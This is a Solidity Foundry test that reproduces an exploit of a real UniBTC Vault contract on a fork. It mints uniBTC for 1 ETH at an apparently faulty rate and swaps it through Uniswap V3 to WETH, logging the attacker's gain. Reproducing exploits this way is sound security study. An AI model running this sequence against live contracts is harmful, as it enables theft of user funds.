// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;
import {Vault} from "./../src/Vault.sol";
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "./interfaces/IERC20.sol";
import {ISwapRouter} from "./interfaces/ISwapRouter.sol";

contract Test_HackUnibtc is Test {
    Vault public UniBtc_Vault;
    IERC20 public Weth;
    address public attacker = makeAddr("attacker");
    ISwapRouter public routerV3;

    function setUp() public {
        UniBtc_Vault = Vault(
            payable(0x047D41F2544B7F63A8e991aF2068a363d210d6Da)
        );
        routerV3 = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        Weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    }

    function test_hack() public {
        deal(attacker, 1 ether);
        address uinbtc_addr = UniBtc_Vault.uniBTC();
        uint balance_UniBtc = IERC20(uinbtc_addr).balanceOf(attacker);
        console.log(
            "balance of ether before hack :: ",
            address(attacker).balance / 1e18,
            " eth"
        );
        console.log(
            "balance before UniBtc hack :: ",
            balance_UniBtc,
            " unibtc"
        );
        vm.startPrank(attacker);
        UniBtc_Vault.mint{value: 1 ether}();
        balance_UniBtc = IERC20(uinbtc_addr).balanceOf(attacker);
        console.log(
            "balance after UniBtc after hack :: ",
            balance_UniBtc / 1e8,
            " unibtc"
        );
        swapUnibtcForWeth(balance_UniBtc);
        console.log(
            "after swapping unibtc for eth :: ",
            Weth.balanceOf(attacker) / 1e18,
            " eth"
        );
        vm.stopPrank();
    }

    function swapUnibtcForWeth(uint256 amountIn) public {
        address Wbtc_addr = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
        IERC20(UniBtc_Vault.uniBTC()).approve(address(routerV3), amountIn);

        ISwapRouter.ExactInputParams memory params = ISwapRouter
            .ExactInputParams({
                path: abi.encodePacked(
                    UniBtc_Vault.uniBTC(),
                    uint24(500),
                    Wbtc_addr,
                    uint24(3000),
                    Weth
                ),
                recipient: attacker,
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0
            });

        routerV3.exactInput(params);
    }
}
